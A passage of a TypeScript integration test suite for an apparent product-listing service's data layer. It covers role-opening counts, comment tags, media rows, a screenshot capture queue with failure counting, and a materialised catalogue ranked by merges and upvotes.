    const counts = await repo.countOpenRoleOpeningsByProfile();
    expect(counts.get(PROFILE)).toBe(2);
    // ABSENT, not zero — the caller reads absence as zero, and that is the
    // genuine-zero case: we counted, and there were none.
    expect(counts.has(PROFILE_TWO)).toBe(false);
  });

  it("does not count a closed role", async () => {
    await seedPublished();
    await repo.upsertRoleOpening({ id: OPENING, profileId: PROFILE, title: "Design lead" });
    await sql.execute(`UPDATE openproduct.role_openings SET status = 'closed' WHERE id = $1`, [OPENING]);
    expect((await repo.countOpenRoleOpeningsByProfile()).has(PROFILE)).toBe(false);
  });

  it("agrees with the per-listing read it replaced", async () => {
    // The equivalence that lets the handler switch: for every listed profile,
    // the batched count equals the length of the old filtered read.
    await seedPublished();
    await repo.upsertRoleOpening({ id: OPENING, profileId: PROFILE, title: "Design lead" });
    const counts = await repo.countOpenRoleOpeningsByProfile();
    const openings = await repo.listPublicRoleOpenings(PROFILE);
    expect(counts.get(PROFILE) ?? 0).toBe(openings.filter((o) => o.status === "open").length);
  });
});

describe("openproduct — a comment may carry the tag a titled discussion used to (openproduct-worldclass-v2 PP0)", () => {
  const THREAD = asUuid("88888888-8888-4888-8888-888888888888");
  const P1 = asUuid("99999999-9999-4999-8999-999999999991");
  const P2 = asUuid("99999999-9999-4999-8999-999999999992");

  it("stores one of the six, reads it back, and leaves an untagged comment null", async () => {
    await seedPublished();
    const thread = await repo.ensureLaunchThread({ id: THREAD, profileId: PROFILE, title: "Comments on acme-thing", authorSubjectId: ACTOR });
    expect(thread).not.toBeNull();
    await repo.createPost({ id: P1, threadId: thread!.id, authorSubjectId: ACTOR, body: "How do I run this?", at: NOW, tag: "question" });
    await repo.createPost({ id: P2, threadId: thread!.id, authorSubjectId: ACTOR, body: "Nice.", at: NOW });
    const posts = await repo.listPosts(thread!.id);
    expect(posts.map((p) => [p.id, p.tag])).toEqual([
      [P1, "question"],
      [P2, null],
    ]);
  });

  it("the schema refuses launch and anything outside the six", async () => {
    await seedPublished();
    const thread = await repo.ensureLaunchThread({ id: THREAD, profileId: PROFILE, title: "Comments on acme-thing", authorSubjectId: ACTOR });
    await expect(
      repo.createPost({ id: P1, threadId: thread!.id, authorSubjectId: ACTOR, body: "x", at: NOW, tag: "launch" as never }),
    ).rejects.toThrow();
    await expect(
      repo.createPost({ id: P2, threadId: thread!.id, authorSubjectId: ACTOR, body: "x", at: NOW, tag: "spam" as never }),
    ).rejects.toThrow();
  });
});

// ---------------------------------------------------------------------------
// MD1 — the media rows a maker writes
// ---------------------------------------------------------------------------
//
// MD0 proved the column refuses the wrong rows. What is proved here is the
// three reads and writes the handler uses, and that the constraints reach
// them: an insert the model refuses is refused by the column too, in words
// the handler can recognise.

describe("MD1 — media rows", () => {
  const MEDIA_ID = asUuid("aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa");
  const REF = `${"c".repeat(64)}.png`;

  it("inserts a hero and reads it back, on a DRAFT", async () => {
    // The maintainer's read is not listed()-gated: a maker edits a draft's
    // gallery before it is public.
    await seedDraft();
    const row = await repo.insertMedia({
      id: MEDIA_ID,
      profileId: PROFILE,
      kind: "hero",
      storageRef: REF,
      alt: "The dashboard",
      width: 1200,
      height: 630,
      position: 0,
    });
    expect(row.kind).toBe("hero");
    expect(row.storageRef).toBe(REF);
    expect((await repo.listMediaForProfile(PROFILE)).map((m) => m.id)).toEqual([MEDIA_ID]);
    // And the PUBLIC read still hides it, because the listing is a draft.
    expect(await repo.listPublicMedia(PROFILE)).toEqual([]);
  });

  it("refuses a second hero at the column, naming the slot index", async () => {
    await seedDraft();
    await repo.insertMedia({
      id: MEDIA_ID, profileId: PROFILE, kind: "hero", storageRef: REF,
      alt: "One", width: 1200, height: 630, position: 0,
    });
    await expect(
      repo.insertMedia({
        id: asUuid("bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"), profileId: PROFILE, kind: "hero",
        storageRef: REF, alt: "Two", width: 1200, height: 630, position: 0,
      }),
    ).rejects.toThrow(/product_media_slot/);
  });

  it("refuses an authored row carrying an observedAt — WC-3 at the column", async () => {
    await seedDraft();
    await expect(
      repo.insertMedia({
        id: MEDIA_ID, profileId: PROFILE, kind: "hero", storageRef: REF,
        alt: "x", width: 1200, height: 630, position: 0, observedAt: NOW,
      }),
    ).rejects.toThrow(/product_media_provenance_check/);
  });

  it("deletes by profile AND id, and returns what it removed", async () => {
    await seedDraft();
    await seedDraft(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    await repo.insertMedia({
      id: MEDIA_ID, profileId: PROFILE, kind: "gallery", storageRef: REF,
      alt: "x", width: 1200, height: 630, position: 2,
    });
    // The wrong profile cannot remove it by guessing the id.
    expect(await repo.deleteMedia(PROFILE_TWO, MEDIA_ID)).toBeNull();
    const removed = await repo.deleteMedia(PROFILE, MEDIA_ID);
    expect(removed?.kind).toBe("gallery");
    expect(removed?.position).toBe(2);
    expect(await repo.listMediaForProfile(PROFILE)).toEqual([]);
  });

  // openproduct-studio OSD2/OSD4 — the logo, at the column.
  it("stores a logo (migration 2255), and a second upload replaces it in one statement", async () => {
    await seedDraft();
    const LOGO_TWO = asUuid("cccccccc-cccc-4ccc-8ccc-cccccccccccc");
    await repo.replaceAuthoredSingleton({
      id: MEDIA_ID, profileId: PROFILE, kind: "logo", storageRef: REF,
      alt: "The mark", width: 256, height: 256, position: 0,
    });
    const next = `${"f".repeat(64)}.png`;
    const row = await repo.replaceAuthoredSingleton({
      id: LOGO_TWO, profileId: PROFILE, kind: "logo", storageRef: next,
      alt: "The new mark", width: 512, height: 512, position: 0,
    });
    expect(row).toMatchObject({ id: LOGO_TWO, kind: "logo", storageRef: next, alt: "The new mark", width: 512 });
    const rows = await repo.listMediaForProfile(PROFILE);
    expect(rows.map((m) => `${m.kind}:${m.id}`)).toEqual([`logo:${LOGO_TWO}`]);
  });

  // openproduct-studio OSD6 — the two statements, at the column.
  it("reorders the gallery without tripping the slot index, and changes alt text in place", async () => {
    await seedDraft();
    const ids = ["dddddddd-dddd-4ddd-8ddd-dddddddddddd", "eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee", "ffffffff-ffff-4fff-8fff-ffffffffffff"].map(asUuid);
    for (const [i, id] of ids.entries()) {
      await repo.insertMedia({ id, profileId: PROFILE, kind: "gallery", storageRef: REF, alt: `g${i}`, width: 1200, height: 630, position: i });
    }
    const rows = await repo.reorderGallery(PROFILE, [ids[2]!, ids[0]!, ids[1]!]);
    expect(rows.map((r) => `${r.alt}:${r.position}`)).toEqual(["g2:0", "g0:1", "g1:2"]);
    const renamed = await repo.updateMediaAlt(PROFILE, ids[0]!, "The first, renamed");
    expect(renamed?.alt).toBe("The first, renamed");
    await expect(repo.updateMediaAlt(PROFILE, ids[0]!, "   ")).rejects.toThrow(/product_media_alt_check/);
  });

  it("orders the logo first, before the hero", async () => {
    await seedDraft();
    await repo.insertMedia({
      id: MEDIA_ID, profileId: PROFILE, kind: "hero", storageRef: REF,
      alt: "h", width: 1200, height: 630, position: 0,
    });
    await repo.insertMedia({
      id: asUuid("cccccccc-cccc-4ccc-8ccc-cccccccccccc"), profileId: PROFILE, kind: "logo", storageRef: REF,
      alt: "l", width: 256, height: 256, position: 0,
    });
    expect((await repo.listMediaForProfile(PROFILE)).map((m) => m.kind)).toEqual(["logo", "hero"]);
  });

  it("orders the maintainer's read like the public one: hero, gallery by position, capture", async () => {
    await seedDraft();
    const g = (id: string, position: number) =>
      repo.insertMedia({
        id: asUuid(id), profileId: PROFILE, kind: "gallery", storageRef: REF,
        alt: "g", width: 1200, height: 630, position,
      });
    await g("dddddddd-dddd-4ddd-8ddd-dddddddddddd", 1);
    await repo.insertMedia({
      id: MEDIA_ID, profileId: PROFILE, kind: "hero", storageRef: REF,
      alt: "h", width: 1200, height: 630, position: 0,
    });
    await g("eeeeeeee-eeee-4eee-8eee-eeeeeeeeeeee", 0);
    const kinds = (await repo.listMediaForProfile(PROFILE)).map((m) => `${m.kind}:${m.position}`);
    expect(kinds).toEqual(["hero:0", "gallery:0", "gallery:1"]);
  });
});

describe("MD4 — the capture queue and its ledger", () => {
  const REF = `${"d".repeat(64)}.png`;
  const REF_TWO = `${"e".repeat(64)}.png`;
  const SHOT = asUuid("cccccccc-cccc-4ccc-8ccc-cccccccccccc");
  const SHOT_TWO = asUuid("dddddddd-dddd-4ddd-8ddd-dddddddddddd");
  const TARGET = "https://acme.example.com";
  const MOVED = "https://acme-thing.example.com";
  // Seven days before NOW: the refresh cutoff the handler computes.
  const REFRESH_BEFORE = "2026-08-10T12:00:00.000Z";
  const STALE_AT = "2026-08-01T12:00:00.000Z";

  async function seedWithAddress(id = PROFILE, projectId = PROJECT, slug = "acme-thing", target = TARGET) {
    await seedPublished(id, projectId, slug);
    await repo.updateProfile(ORG, id, { liveUrl: target, updatedBy: ACTOR });
  }

  it("a listed listing with an address and no capture is due — by its slug, with the address as written", async () => {
    await seedWithAddress();
    // Listed, but no address: nothing to visit.
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    const due = await repo.listDueCaptures(REFRESH_BEFORE);
    expect(due).toEqual([
      { profileId: PROFILE, slug: "acme-thing", target: TARGET, observedAt: null, failureCount: 0 },
    ]);
  });

  it("a draft with an address is not due — the queue is a public read", async () => {
    await seedDraft();
    await repo.updateProfile(ORG, PROFILE, { liveUrl: TARGET, updatedBy: ACTOR });
    expect(await repo.listDueCaptures(REFRESH_BEFORE)).toEqual([]);
  });

  it("a fresh capture is not due; one past the refresh is, carrying its moment", async () => {
    await seedWithAddress();
    await repo.replaceScreenshot({
      id: SHOT, profileId: PROFILE, kind: "screenshot", storageRef: REF,
      alt: "An automated screenshot", width: 1280, height: 800, position: 0, observedAt: NOW,
    });
    expect(await repo.listDueCaptures(REFRESH_BEFORE)).toEqual([]);

    await repo.replaceScreenshot({
      id: SHOT_TWO, profileId: PROFILE, kind: "screenshot", storageRef: REF_TWO,
      alt: "An automated screenshot", width: 1280, height: 800, position: 0, observedAt: STALE_AT,
    });
    const due = await repo.listDueCaptures(REFRESH_BEFORE);
    expect(due.map((d) => [d.slug, d.observedAt])).toEqual([["acme-thing", STALE_AT]]);
  });

  it("replaceScreenshot writes into the ONE slot: a retake leaves one row, the newer picture, the same id", async () => {
    await seedWithAddress();
    const first = await repo.replaceScreenshot({
      id: SHOT, profileId: PROFILE, kind: "screenshot", storageRef: REF,
      alt: "First", width: 1280, height: 800, position: 0, observedAt: STALE_AT,
    });
    const second = await repo.replaceScreenshot({
      id: SHOT_TWO, profileId: PROFILE, kind: "screenshot", storageRef: REF_TWO,
      alt: "Second", width: 1280, height: 720, position: 0, observedAt: NOW,
    });
    expect(second.id).toBe(first.id);
    expect([second.storageRef, second.alt, second.height, second.observedAt]).toEqual([REF_TWO, "Second", 720, NOW]);
    const rows = await repo.listMediaForProfile(PROFILE);
    expect(rows.map((r) => `${r.kind}:${r.storageRef.slice(0, 4)}`)).toEqual(["screenshot:eeee"]);
    // And it is the public read's capture too.
    expect((await repo.listPublicMedia(PROFILE)).map((r) => r.kind)).toEqual(["screenshot"]);
  });

  it("still refuses a screenshot without its moment — WC-3 at the column, through the new write too", async () => {
    await seedWithAddress();
    await expect(
      repo.replaceScreenshot({
        id: SHOT, profileId: PROFILE, kind: "screenshot", storageRef: REF,
        alt: "x", width: 1280, height: 800, position: 0, observedAt: null,
      }),
    ).rejects.toThrow(/product_media_provenance_check/);
  });

  it("a failure counts, a success clears, the tolerance withdraws the address — and a changed address re-arms it", async () => {
    await seedWithAddress();
    const one = await repo.recordCaptureFailure(PROFILE, TARGET, "provider_refused", NOW, 3);
    expect([one.failureCount, one.lastError, one.withdrawnAt, one.capturedAt]).toEqual([1, "provider_refused", null, null]);
    const two = await repo.recordCaptureFailure(PROFILE, TARGET, "not_an_image", NOW, 3);
    expect(two.failureCount).toBe(2);
    // Still in the queue, and the queue says how many times it has failed.
    expect((await repo.listDueCaptures(REFRESH_BEFORE)).map((d) => d.failureCount)).toEqual([2]);

    const ok = await repo.recordCaptureSuccess(PROFILE, TARGET, NOW);
    expect([ok.failureCount, ok.lastError, ok.withdrawnAt, ok.capturedAt]).toEqual([0, null, null, NOW]);

    await repo.recordCaptureFailure(PROFILE, TARGET, "provider_unreachable", NOW, 3);
    await repo.recordCaptureFailure(PROFILE, TARGET, "provider_unreachable", NOW, 3);
    const withdrawn = await repo.recordCaptureFailure(PROFILE, TARGET, "provider_unreachable", NOW, 3);
    expect([withdrawn.failureCount, withdrawn.withdrawnAt]).toEqual([3, NOW]);
    // The last success is remembered through the failures.
    expect(withdrawn.capturedAt).toBe(NOW);
    expect(await repo.listDueCaptures(REFRESH_BEFORE)).toEqual([]);

    // The maker fixes the address: the ledger row is about the OLD one.
    await repo.updateProfile(ORG, PROFILE, { liveUrl: MOVED, updatedBy: ACTOR });
    const rearmed = await repo.listDueCaptures(REFRESH_BEFORE);
    expect(rearmed.map((d) => [d.target, d.failureCount])).toEqual([[MOVED, 0]]);
    const fresh = await repo.recordCaptureFailure(PROFILE, MOVED, "target_refused", NOW, 3);
    expect([fresh.target, fresh.failureCount, fresh.withdrawnAt]).toEqual([MOVED, 1, null]);
  });

  it("orders never-tried before the oldest attempt, so a run that cannot finish the queue finishes it next time", async () => {
    await seedWithAddress(PROFILE, PROJECT, "acme-thing");
    await seedWithAddress(PROFILE_TWO, PROJECT_TWO, "beta-thing", "https://beta.example.com");
    await repo.recordCaptureFailure(PROFILE, TARGET, "provider_refused", NOW, 8);
    expect((await repo.listDueCaptures(REFRESH_BEFORE)).map((d) => d.slug)).toEqual(["beta-thing", "acme-thing"]);
    // And the cap is honoured.
    expect((await repo.listDueCaptures(REFRESH_BEFORE, 1)).map((d) => d.slug)).toEqual(["beta-thing"]);
  });
});

describe("OS5 — the catalogue is materialised", () => {
  const T1 = "2026-08-17T12:10:00.000Z";
  const T2 = "2026-08-17T12:20:00.000Z";
  const T3 = "2026-08-17T12:30:00.000Z";
  const T4 = "2026-08-17T12:40:00.000Z";
  // Two days, as the contract's rule (two freshness windows of `merges`) would compute it.
  const MERGES_SINCE = "2026-08-15T12:10:00.000Z";
  const METRIC_A = asUuid("a1a1a1a1-a1a1-4a1a-8a1a-a1a1a1a1a1a1");
  const METRIC_B = asUuid("b2b2b2b2-b2b2-4b2b-8b2b-b2b2b2b2b2b2");
  const METRIC_C = asUuid("c3c3c3c3-c3c3-4c3c-8c3c-c3c3c3c3c3c3");
  const METRIC_D = asUuid("d4d4d4d4-d4d4-4d4d-8d4d-d4d4d4d4d4d4");
  const MEDIA = asUuid("e5e5e5e5-e5e5-4e5e-8e5e-e5e5e5e5e5e5");

  async function seedWithSignals() {
    await seedPublished();
    // Two `merges` observations, so "latest" is exercised; one with
    // microseconds, so the JSON round trip is exercised; one other metric.
    await repo.writeMetric({ id: METRIC_A, profileId: PROFILE, metric: "merges", window: "7d", value: 9, source: "linked_repo", observedAt: "2026-08-16T11:00:00.000Z" });
    await repo.writeMetric({ id: METRIC_B, profileId: PROFILE, metric: "merges", window: "7d", value: 12, source: "linked_repo", observedAt: "2026-08-17T11:00:00.123456Z" });
    await repo.writeMetric({ id: METRIC_C, profileId: PROFILE, metric: "stars", window: "total", value: 300, source: "linked_repo", observedAt: "2026-08-17T11:00:00.000Z" });
    await repo.insertMedia({ id: MEDIA, profileId: PROFILE, kind: "hero", storageRef: `${"d".repeat(64)}.png`, alt: "The hero", width: 1200, height: 630, position: 0 });
  }

  it("never computed: the page says so and carries nothing, whatever is listed", async () => {
    await seedPublished();
    const page = await repo.listCataloguePage({ cursor: null, limit: 100 });
    expect(page).toEqual({
      computedAt: null,
      cards: [],
      metrics: new Map(),
      media: new Map(),
      next: null,
      windows: { today: 0, week: 0, month: 0, total: 0 },
    });
    expect((await repo.getSweepPhaseStates()).catalogue.lastRunAt).toBeNull();
  });

  it("after a rebuild the page IS the live join — cards, latest observations, media and census — with the moment", async () => {
    await seedWithSignals();
    const report = await repo.rebuildCatalogue({ now: T1, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    expect(report).toEqual({ computedAt: T1, cards: 1, written: 1, removed: 0 });

    const live = await repo.listPublicCardsPage({ cursor: null, limit: 100, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    const built = await repo.listCataloguePage({ cursor: null, limit: 100 });
    expect(built.computedAt).toBe(T1);
    expect(built.cards).toEqual(live.cards);
    expect(built.next).toEqual(live.next);
    expect(built.metrics).toEqual(await repo.latestMetricsForSlugs(["acme-thing"]));
    expect(built.media).toEqual(await repo.listPublicMediaForSlugs(["acme-thing"]));
    expect(built.windows).toEqual(await repo.countPublishedWindows(T1));
    // The latest `merges` is the one the ordering read; the microsecond
    // observation came back in the form every other read gives.
    const merges = built.metrics.get("acme-thing")!.filter((m) => m.metric === "merges");
    expect(merges).toHaveLength(1);
    expect(merges[0]!.value).toBe(12);
    expect(merges[0]!.observedAt).toBe("2026-08-17T11:00:00.123Z");
    // And the ledger reads the moment as the phase's run.
    expect((await repo.getSweepPhaseStates()).catalogue.lastRunAt).toBe(T1);
  });

  it("a quiet tick writes nothing; a changed listing is rewritten; a delisted one is removed", async () => {
    await seedWithSignals();
    await repo.rebuildCatalogue({ now: T1, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    expect(await repo.rebuildCatalogue({ now: T2, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE })).toEqual({ computedAt: T2, cards: 1, written: 0, removed: 0 });
    // The singleton moved; the row kept the moment it was last written.
    expect((await repo.listCataloguePage({ cursor: null, limit: 10 })).computedAt).toBe(T2);
    const row = await sql.execute<{ computed_at: string | Date }>(`SELECT computed_at FROM openproduct.catalog_cards`);
    expect(new Date(row.rows[0]!.computed_at).toISOString()).toBe(T1);

    await repo.writeMetric({ id: METRIC_D, profileId: PROFILE, metric: "merges", window: "7d", value: 13, source: "linked_repo", observedAt: T2 });
    expect(await repo.rebuildCatalogue({ now: T3, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE })).toEqual({ computedAt: T3, cards: 1, written: 1, removed: 0 });
    expect((await repo.listCataloguePage({ cursor: null, limit: 10 })).metrics.get("acme-thing")!.find((m) => m.metric === "merges")!.value).toBe(13);

    await repo.unpublishProfile(ORG, PROFILE, ACTOR);
    expect(await repo.rebuildCatalogue({ now: T4, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE })).toEqual({ computedAt: T4, cards: 0, written: 0, removed: 1 });
    const gone = await repo.listCataloguePage({ cursor: null, limit: 10 });
    expect(gone.cards).toEqual([]);
    expect(gone.computedAt).toBe(T4);
    expect(gone.windows.total).toBe(0);
  });

  it("pages by the cursor the live read issues, and the pages concatenate to the live walk", async () => {
    await seedWithSignals();
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    await repo.rebuildCatalogue({ now: T1, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    const first = await repo.listCataloguePage({ cursor: null, limit: 1 });
    expect(first.cards.map((c) => c.slug)).toEqual(["acme-thing"]);
    expect(first.next).toEqual({ activity: 13012, publishedAt: first.cards[0]!.publishedAt, slug: "acme-thing" });
    const second = await repo.listCataloguePage({ cursor: first.next, limit: 1 });
    expect(second.cards.map((c) => c.slug)).toEqual(["beta-thing"]);
    expect(second.next).toBeNull();
    const live = await repo.listPublicCardsPage({ cursor: null, limit: 10, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    expect([...first.cards, ...second.cards]).toEqual(live.cards);
    expect(first.windows.total).toBe(2);
  });
});

describe("openproduct-studio OSD3 — a logo reaches the home list without the sweep", () => {
  const T1 = "2026-08-17T12:10:00.000Z";
  const T2 = "2026-08-17T12:20:00.000Z";
  const MERGES_SINCE = "2026-08-15T12:10:00.000Z";
  const LOGO = asUuid("f6f6f6f6-f6f6-4f6f-8f6f-f6f6f6f6f6f6");
  const LOGO_REF = `${"f".repeat(64)}.png`;
  const logo = () =>
    repo.insertMedia({ id: LOGO, profileId: PROFILE, kind: "logo", storageRef: LOGO_REF, alt: "The mark", width: 256, height: 256, position: 0 });

  it("refreshes ONE row's media to exactly what a rebuild would write, and nothing else", async () => {
    await seedPublished();
    await repo.rebuildCatalogue({ now: T1, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE });
    await logo();
    expect((await repo.listCataloguePage({ cursor: null, limit: 10 })).media.get("acme-thing")).toBeUndefined();

    expect(await repo.refreshCatalogueMedia(PROFILE)).toBe(true);
    const refreshed = await repo.listCataloguePage({ cursor: null, limit: 10 });
    expect(refreshed.media.get("acme-thing")!.map((m) => m.kind)).toEqual(["logo"]);
    expect(refreshed.media).toEqual(await repo.listPublicMediaForSlugs(["acme-thing"]));
    // The sweep's moment is untouched, and the sweep then finds nothing to do.
    expect(refreshed.computedAt).toBe(T1);
    expect((await repo.rebuildCatalogue({ now: T2, mergesSince: MERGES_SINCE, endorsementsSince: MERGES_SINCE })).written).toBe(0);

    // A second refresh with nothing changed writes nothing.
    expect(await repo.refreshCatalogueMedia(PROFILE)).toBe(false);
    // And a removal empties it again.
    await repo.deleteMedia(PROFILE, LOGO);
    expect(await repo.refreshCatalogueMedia(PROFILE)).toBe(true);
    expect((await repo.listCataloguePage({ cursor: null, limit: 10 })).media.get("acme-thing")).toBeUndefined();
  });

  it("adds no row the sweep has not: a draft, or a listing never catalogued, is the sweep's", async () => {
    await seedDraft();
    await logo();
    expect(await repo.refreshCatalogueMedia(PROFILE)).toBe(false);
    const rows = await sql.execute(`SELECT 1 FROM openproduct.catalog_cards`);
    expect(rows.rows).toHaveLength(0);
  });

  it("reads many profiles' media in one query, drafts included, keyed by profile id", async () => {
    await seedDraft();
    await seedDraft(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    await logo();
    const byProfile = await repo.listMediaForProfiles([PROFILE, PROFILE_TWO]);
    expect(byProfile.get(PROFILE)!.map((m) => m.kind)).toEqual(["logo"]);
    expect(byProfile.has(PROFILE_TWO)).toBe(false);
    expect(await repo.listMediaForProfiles([])).toEqual(new Map());
  });
});

describe("openproduct-open-builds OB3 — Most active is work times interest", () => {
  const T1 = "2026-08-17T12:10:00.000Z";
  const SINCE = "2026-08-15T12:10:00.000Z";
  const DAY_BEFORE = "2026-08-16T12:00:00.000Z";
  const M_ACME = asUuid("a7a7a7a7-a7a7-4a7a-8a7a-a7a7a7a7a7a7");
  const M_BETA = asUuid("b8b8b8b8-b8b8-4b8b-8b8b-b8b8b8b8b8b8");

  async function seedTwo() {
    await seedPublished();
    await seedPublished(PROFILE_TWO, PROJECT_TWO, "beta-thing");
    // acme: lots of work, nobody asking. beta: a little work, five people asking.
    await repo.writeMetric({ id: M_ACME, profileId: PROFILE, metric: "merges", window: "7d", value: 12, source: "declared_repo", observedAt: T1 });
    await repo.writeMetric({ id: M_BETA, profileId: PROFILE_TWO, metric: "merges", window: "7d", value: 2, source: "declared_repo", observedAt: T1 });
    for (let i = 0; i < 5; i += 1) await repo.endorse(PROFILE_TWO, `voter-${i}`, "confirmed", DAY_BEFORE);
  }

  const upvotes = async (profileId: string) =>
    (await repo.latestMetrics(profileId)).filter((m) => m.metric === "endorsements");

  it("the tick re-counts every listed build's upvotes in one statement, and writes only what moved", async () => {
    await seedTwo();
    // First count: both windows for both builds, zeros included.
    expect(await repo.refreshEndorsementCounts({ now: T1, republishBefore: SINCE })).toBe(4);
    expect((await upvotes(PROFILE_TWO)).map((m) => [m.window, m.value]).sort()).toEqual([["7d", 5], ["total", 5]]);
    expect((await upvotes(PROFILE)).map((m) => m.value)).toEqual([0, 0]);
    // A quiet tick writes nothing.
    expect(await repo.refreshEndorsementCounts({ now: T1, republishBefore: SINCE })).toBe(0);
    // Eight days on, nobody voted, but the week moved: only beta's `7d` is rewritten.
    const later = "2026-08-25T12:10:00.000Z";
    expect(await repo.refreshEndorsementCounts({ now: later, republishBefore: T1 })).toBe(1);
    expect((await upvotes(PROFILE_TWO)).find((m) => m.window === "7d")!.value).toBe(0);
    // And a quiet count past its republish age is written again, unchanged —
    // the three written at T1; beta's `7d` was written at `later` itself.
    expect(await repo.refreshEndorsementCounts({ now: later, republishBefore: later })).toBe(3);
  });

  it("orders the catalogue and the live join by (merges + 1) × (upvotes + 1), and they agree", async () => {
    await seedTwo();
    await repo.refreshEndorsementCounts({ now: T1, republishBefore: SINCE });
    await repo.rebuildCatalogue({ now: T1, mergesSince: SINCE, endorsementsSince: SINCE });
    const built = await repo.listCataloguePage({ cursor: null, limit: 10 });
    const live = await repo.listPublicCardsPage({ cursor: null, limit: 10, mergesSince: SINCE, endorsementsSince: SINCE });
    // beta: 3 × 6 = 18 beats acme: 13 × 1 = 13.
    expect(built.cards.map((c) => c.slug)).toEqual(["beta-thing", "acme-thing"]);
    expect(live.cards.map((c) => c.slug)).toEqual(["beta-thing", "acme-thing"]);
    // The cursor is the folded key, and both reads issue the same one.
    const firstBuilt = await repo.listCataloguePage({ cursor: null, limit: 1 });
    const firstLive = await repo.listPublicCardsPage({ cursor: null, limit: 1, mergesSince: SINCE, endorsementsSince: SINCE });
    expect(firstBuilt.next).toEqual({ activity: 18_002, publishedAt: firstBuilt.cards[0]!.publishedAt, slug: "beta-thing" });
    expect(firstLive.next).toEqual(firstBuilt.next);
    const second = await repo.listCataloguePage({ cursor: firstBuilt.next, limit: 1 });
    expect(second.cards.map((c) => c.slug)).toEqual(["acme-thing"]);
  });

  it("reads no upvote count older than its floor — the build ranks on its changes alone", async () => {
    await seedTwo();
    await repo.refreshEndorsementCounts({ now: T1, republishBefore: SINCE });
    const page = await repo.listPublicCardsPage({ cursor: null, limit: 10, mergesSince: SINCE, endorsementsSince: "2026-08-18T00:00:00.000Z" });
    expect(page.cards.map((c) => c.slug)).toEqual(["acme-thing", "beta-thing"]);
  });
});
